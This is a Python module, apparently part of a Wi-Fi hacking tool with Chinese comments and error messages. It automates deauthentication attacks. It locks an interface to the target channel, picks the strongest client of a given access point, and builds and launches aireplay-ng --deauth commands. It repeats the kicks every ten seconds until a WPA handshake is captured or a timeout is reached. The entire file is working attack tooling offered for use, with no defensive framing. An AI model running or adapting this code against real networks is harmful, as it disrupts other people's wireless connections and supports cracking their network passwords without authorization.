





from dataclasses import dataclass
import re
import time
from typing import List, Optional

from wifi_infra.errors import WifiHackingToolError
from wifi_infra.parse import Station, _looks_like_mac, parse_csv
from wifi_infra.runner import OutResult, ProcessHandler, run_command, start_process
from .scan import scan_command

@dataclass
class DeauthRound:
    handler: ProcessHandler
    station: Optional[str]
    argv: List[str]
    round_num: int




def lock_channel(iface: str, channel: int) -> None:
    result = run_command(["iw", "dev", iface, "set", "channel", str(channel)], timeout=5)
    if result.outResult == OutResult.NOTFOUND:
        raise WifiHackingToolError("[依赖缺失] 找不到 iw 命令", return_code=3)
    if result.outResult == OutResult.PERMISSION:
        raise WifiHackingToolError("[权限不足] 请使用管理员权限运行", return_code=4)
    if result.outResult != OutResult.OK:
        raise WifiHackingToolError(
            f"[未知错误] 锁定信道失败 iw dev {iface} set channel {channel}: {result.stderr or ''}",
            return_code=1,
        )

    # 检查是否成功
    result = run_command(["iw", "dev", iface, "info"], timeout=5)
    if result.outResult != OutResult.OK or not result.stdout:
        raise WifiHackingToolError(f"无法读取 {iface} 的信息", return_code=1)

    m = re.search(r"channel\s+(\d+)", result.stdout)
    if not m or int(m.group(1)) != channel:
        actual = int(m.group(1)) if m else "未知"
        raise WifiHackingToolError(
            f"锁定信道失败: {iface} 信道未切换到 {channel}, 当前信道: {actual}",
            return_code=1,
        )

def _normalize_mac(mac: str) -> str:
    return mac.strip().upper()

def validate_bssid(bssid: str) -> str:
    """校验 AP 的 bssid"""
    if not bssid or not _looks_like_mac(bssid):
        raise WifiHackingToolError(
            f"BSSID 格式错误：{bssid!r}（应为 AA:BB:CC:DD:EE:FF）", return_code=2
        )
    return _normalize_mac(bssid)

def validate_station(mac: str) -> str:
    """校验客户端的 mac"""
    if mac is None:
        raise WifiHackingToolError("station MAC 不能为空", return_code=2)
    if not isinstance(mac, str):                      
        raise WifiHackingToolError(
            f"station MAC 必须是字符串，收到 {type(mac).__name__}：{mac!r}", return_code=2
        )
    if mac.strip().lower() == "all":
        return "all"
    if not _looks_like_mac(mac):
        raise WifiHackingToolError(
            f"Station MAC 格式错误：{mac!r}（应为 AA:BB:CC:DD:EE:FF 或 all）", return_code=2
        )
    return _normalize_mac(mac)


def pick_station(stations: List[Station], bssid: str) -> Optional[str]:
    """
    从扫描结果里挑这个 AP 下的客户端（信号最强的那个）。
    """
    target = validate_bssid(bssid)
    candidates = [
        sta for sta in stations
        if sta.bssid is not None and _normalize_mac(sta.bssid) == target
    ]
    if not candidates:
        return None

    best = max(
        candidates,
        key=lambda sta: (sta.power if sta.power is not None else -999)
    )
    return best.mac


def pick_station_with_wait(csv_path: str, bssid: str, timeout: float = 10.0, interval: float = 1.0) -> Optional[str]:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            res = parse_csv(csv_path)
        except (OSError, ValueError):
            time.sleep(interval)          # 正在写，读到一半 → 等下一轮
            continue

        mac = pick_station(res.stations, bssid)
        if mac is not None:
            return mac
        
        time.sleep(interval)
    return None



def build_deauth_argv(iface: str, bssid: str, station_mac: str, count: int) -> List[str]:
    """
    构造 aireplay-ng 命令
    单播带-c, 广播不带
    """
    bssid = validate_bssid(bssid)
    argv: List[str] = [
        "aireplay-ng",
        "--deauth", str(count),
        "-a", bssid
    ]

    if station_mac is not None and station_mac.strip().lower() != "all":
        station = validate_station(station_mac)
        argv += ["-c", station]

    argv += [iface]
    return argv


def decide_round(
    rounds_done: int,
    since_last_kick: float,
    elapsed: float,
    handshakes: int,
    timeout: float
) -> str:
    """
    轮询决策
    'stop' -> 抓到握手包, 停止; 或超时
    'deauth-again' -> 等够了、还没抓到、没超时 -> 再踢一轮
    'wait' -> 还没到冷却时间
    """
    if handshakes >= 1:
        return "stop"
    if elapsed >= timeout:
        return "stop"
    if since_last_kick >= 10:
        return "deauth-again"
    return "wait"
    
    

def run_deauth_round(
    iface: str, bssid: str, channel: int, station: Optional[str], count: int, rounds_num: int
) -> DeauthRound:
    
    # 发起 deauth
    d_argv = build_deauth_argv(iface, bssid, station, count)
    deauth_handler = start_process(d_argv)
    if deauth_handler.proc is None:
        raise WifiHackingToolError(
            f"启动 aireplay-ng 失败: [{deauth_handler.error}]", return_code=3
        )

    return DeauthRound(
        deauth_handler,
        station,
        d_argv,
        rounds_num
    )


def stop_deauth_round(current_round: DeauthRound) -> None:
    if current_round is None:
        return
    if current_round.handler is not None:
        current_round.handler.terminate()
    